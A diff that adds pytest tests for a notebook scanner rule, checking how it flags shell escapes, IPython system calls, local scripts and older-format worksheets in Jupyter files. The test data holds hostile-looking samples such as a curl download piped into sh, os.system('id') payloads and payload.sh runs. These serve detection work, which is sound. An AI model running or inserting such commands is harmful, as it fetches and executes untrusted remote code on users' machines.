@@ -797,3 +797,239 @@ def test_an_ipython_object_use_the_rule_does_not_read_is_inconclusive(
 def test_an_inert_use_of_the_ipython_object_is_clean(tmp_path: Path, cell: str) -> None:
     (tmp_path / "nb.ipynb").write_text(_notebook(cell))
     assert _run(tmp_path) == ([], [])
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "def run(shell):\n    shell.system('ls')\nrun(get_ipython())\n",
+        "ip = get_ipython()\nhelper(ip)\n",
+        "ip = get_ipython()\nhelpers.install(shell=ip)\n",
+        "launch(get_ipython)\n",
+    ],
+)
+def test_the_ipython_object_handed_to_a_call_is_inconclusive(tmp_path: Path, cell: str) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+    findings, shortfalls = _run(tmp_path)
+    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
+    assert "IPython object" in findings[0][1]
+    assert len(shortfalls) == 1
+
+
+_KERNEL_CHECK_CELL = (
+    "ip = get_ipython()\n"
+    "if isinstance(ip, object) and hasattr(ip, 'kernel'):\n"
+    "    print(type(ip))\n"
+)
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "print(get_ipython())\n",
+        _KERNEL_CHECK_CELL,
+        "getattr(get_ipython(), 'execution_count')\n",
+    ],
+)
+def test_the_ipython_object_given_to_a_builtin_that_runs_nothing_is_clean(
+    tmp_path: Path, cell: str
+) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+    assert _run(tmp_path) == ([], [])
+
+
+def test_a_builtin_name_the_notebook_rebinds_is_not_trusted_with_the_ipython_object(
+    tmp_path: Path,
+) -> None:
+    (tmp_path / "nb.ipynb").write_text(
+        _notebook("def print(shell):\n    shell.system('ls')\n", "print(get_ipython())\n")
+    )
+    findings, _ = _run(tmp_path)
+    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
+
+
+@pytest.mark.parametrize(
+    ("cells", "script"),
+    [
+        (("!sh setup.sh\n",), "setup.sh"),
+        (("!bash -x scripts/install.sh --fast\n",), "scripts/install.sh"),
+        (("!./run\n",), "./run"),
+        (("!cd repo && ./configure\n",), "./configure"),
+        (("%system tools/stage2.sh\n",), "tools/stage2.sh"),
+        (("system /srv/stage2.sh",), "/srv/stage2.sh"),
+        (("%%bash\nset -e\nbash payload.sh\n",), "payload.sh"),
+        (("%%sh\nsh<payload.sh\n",), "payload.sh"),
+        (("%alias_magic -c time bash", "%%time\nsh<payload.sh\n"), "payload.sh"),
+        (("!source env/activate.sh\n",), "env/activate.sh"),
+        (("!sudo -u builder /bin/bash build.sh\n",), "build.sh"),
+        (("!python train.py --epochs 3\n",), "train.py"),
+        (("get_ipython().system('sh setup.sh')\n",), "setup.sh"),
+    ],
+)
+def test_a_cell_that_runs_a_local_script_is_a_low_finding_naming_it(
+    tmp_path: Path, cells: tuple[str, ...], script: str
+) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(*cells))
+    findings, shortfalls = _run(tmp_path)
+    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", None)]
+    assert findings[0][1].endswith(f": {script}")
+    assert shortfalls == []
+
+
+def test_every_script_a_cell_runs_is_named_in_one_finding(tmp_path: Path) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook("!sh a.sh\n!bash b.sh && sh a.sh\n"))
+    findings, _ = _run(tmp_path)
+    assert [(sev, summary) for sev, summary, _ in findings] == [
+        ("LOW", "cell runs local scripts: a.sh, b.sh")
+    ]
+
+
+def test_a_local_script_beside_a_download_piped_to_a_shell_keeps_the_high_finding(
+    tmp_path: Path,
+) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(f"!{_PIPE}\n!sh setup.sh\n"))
+    findings, _ = _run(tmp_path)
+    assert sorted(sev for sev, _, _ in findings) == ["HIGH", "LOW"]
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "!python -m pip install numpy\n",
+        "!python3 -c 'print(1)'\n",
+        "!pip install -r requirements.txt\n",
+        "!ls -la /tmp > listing.txt 2>&1\n",
+        "!git clone https://example.invalid/repo.git\n",
+        "!/opt/conda/bin/pip install numpy\n",
+        "%%bash\nnvidia-smi\necho done\n",
+        "!sh -c 'echo hi'\n",
+    ],
+)
+def test_a_tool_run_without_a_script_file_is_not_a_local_script(tmp_path: Path, cell: str) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+    assert _run(tmp_path) == ([], [])
+
+
+_PAYLOAD = "import os\nos.system('id')\n"
+
+
+def _v3(worksheets: object, **extra: object) -> str:
+    return json.dumps({"nbformat": 3, "nbformat_minor": 0, "worksheets": worksheets, **extra})
+
+
+def _v3_code(text: object) -> dict[str, object]:
+    return {"cell_type": "code", "language": "python", "input": text, "outputs": []}
+
+
+@pytest.mark.parametrize(
+    "decoy",
+    [None, [], [{"cell_type": "code", "source": "print('hello')\n"}]],
+    ids=["no-cells", "empty-cells", "benign-cells"],
+)
+def test_a_worksheet_cell_nbformat_upgrades_and_runs_is_scanned(
+    tmp_path: Path, decoy: object
+) -> None:
+    """nbformat replaces a v3 notebook's `cells` with the cells of its worksheets."""
+    extra = {} if decoy is None else {"cells": decoy}
+    worksheets = [{"cells": [{"cell_type": "markdown", "source": "x"}, _v3_code(_PAYLOAD)]}]
+    (tmp_path / "nb.ipynb").write_text(_v3(worksheets, **extra))
+
+    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))
+
+    assert [(f.severity.name, f.target_ref) for f in findings] == [
+        ("HIGH", f"{tmp_path / 'nb.ipynb'}:worksheet0.cell1")
+    ]
+    assert _unread(tmp_path) == []
+
+
+def test_every_worksheet_is_read_and_lines_of_input_are_joined(tmp_path: Path) -> None:
+    worksheets = [{"cells": []}, {"cells": [_v3_code(["import os\n", "os.system('id')\n"])]}]
+    (tmp_path / "nb.ipynb").write_text(_v3(worksheets))
+
+    assert [sev for sev, _ in _findings(tmp_path)] == ["HIGH"]
+
+
+def test_a_benign_v3_notebook_is_clean(tmp_path: Path) -> None:
+    worksheets = [
+        {
+            "cells": [
+                {"cell_type": "heading", "level": 1, "source": "os.system in prose"},
+                {"cell_type": "raw", "source": "os.system('id')"},
+                _v3_code("x = 1\nprint(x)\n"),
+                {"cell_type": "code", "language": "python", "outputs": []},
+            ]
+        }
+    ]
+    (tmp_path / "nb.ipynb").write_text(_v3(worksheets))
+
+    assert _findings(tmp_path) == []
+    assert _unread(tmp_path) == []
+
+
+def test_a_v1_code_field_the_upgrade_reads_is_scanned(tmp_path: Path) -> None:
+    """A notebook without `nbformat` is read as v1, whose code cells keep their code in `code`."""
+    cells = [{"cell_type": "code", "code": _PAYLOAD}]
+    (tmp_path / "nb.ipynb").write_text(json.dumps({"cells": cells}))
+
+    assert [sev for sev, _ in _findings(tmp_path)] == ["HIGH"]
+    assert _unread(tmp_path) == []
+
+
+def test_names_bound_in_one_reading_do_not_change_another(tmp_path: Path) -> None:
+    """The worksheets run without the top-level cells, so a name bound there binds nothing."""
+    cells = [{"cell_type": "code", "source": "ls = 1\n"}]
+    worksheets = [{"cells": [_v3_code("ls -la; curl -s https://x.invalid/i | sh\n")]}]
+    (tmp_path / "nb.ipynb").write_text(_v3(worksheets, cells=cells))
+
+    assert ("HIGH", "shell escape pipes a download into a shell") in _findings(tmp_path)
+
+
+@pytest.mark.parametrize(
+    "document",
+    [
+        {"nbformat": 3, "worksheets": {"cells": []}},
+        {"nbformat": 3, "worksheets": ["not a worksheet"]},
+        {"nbformat": 3, "worksheets": [{"cells": "not a list"}]},
+        {"nbformat": 3, "worksheets": [{"metadata": {}}]},
+        {"nbformat": 3, "worksheets": [{"cells": [_v3_code({"not": "text"})]}]},
+        {"nbformat": 3, "worksheets": [{"cells": ["not a cell"]}]},
+        {"cells": {"not": "a list"}, "worksheets": []},
+        {"cells": [{"cell_type": "code", "code": 7}]},
+    ],
+    ids=[
+        "worksheets-not-a-list",
+        "worksheet-not-an-object",
+        "cells-not-a-list",
+        "no-cells",
+        "input-not-text",
+        "cell-not-an-object",
+        "top-level-cells-not-a-list",
+        "v1-code-not-text",
+    ],
+)
+def test_a_notebook_whose_structure_cannot_be_read_is_not_cleared(
+    tmp_path: Path, document: dict[str, object]
+) -> None:
+    (tmp_path / "nb.ipynb").write_text(json.dumps(document))
+
+    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))
+
+    assert "Notebook not scanned" in [f.title for f in findings]
+    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]
+
+
+def test_an_unreadable_worksheet_does_not_hide_a_payload_in_the_next(tmp_path: Path) -> None:
+    worksheets = [{"cells": "not a list"}, {"cells": [_v3_code(_PAYLOAD)]}]
+    (tmp_path / "nb.ipynb").write_text(_v3(worksheets))
+
+    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))
+
+    assert sorted(f.severity.name for f in findings) == ["HIGH", "LOW"]
+
+
+def test_a_notebook_nested_too_deep_to_parse_is_not_cleared(tmp_path: Path) -> None:
+    (tmp_path / "nb.ipynb").write_text("[" * 200_000)
+
+    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))
+
+    assert [f.title for f in findings] == ["Notebook not scanned"]
